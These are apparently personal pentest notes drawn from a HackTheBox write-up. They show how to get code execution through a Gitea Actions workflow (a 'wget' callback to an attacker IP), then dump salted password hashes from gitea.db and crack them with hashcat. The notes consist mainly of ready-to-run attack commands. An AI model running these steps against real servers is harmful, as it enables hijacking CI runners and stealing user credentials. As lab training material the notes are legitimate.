### Runners

Example:

![[Pasted image 20250605111331.png]]

Create a `yaml` file:

```bash
name: GitHub Actions Demo
run-name: ${{ github.actor }} is testing out GitHub Actions
on: [push]
jobs:
  Explore-GitHub-Actions:
    runs-on: windows-latest
    steps:
      - run: wget http://10.8.6.108
```

And ensure the file is in a location similar to this: `.gitea/workflows/ci.yml`. 

File name can be anything:

![[Pasted image 20250605113243.png]]

Within the settings in the repository, ensure this setting is enabled:

![[Pasted image 20250605113342.png]]

### Retrieve salted hashes from Gitea database

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

Hashcat mode `-m 10900`

```bash
hashcat -m 10900 gitea.hashes /opt/rockyou.txt --username
```

Reference: https://0xdf.gitlab.io/2024/12/14/htb-compiled.html
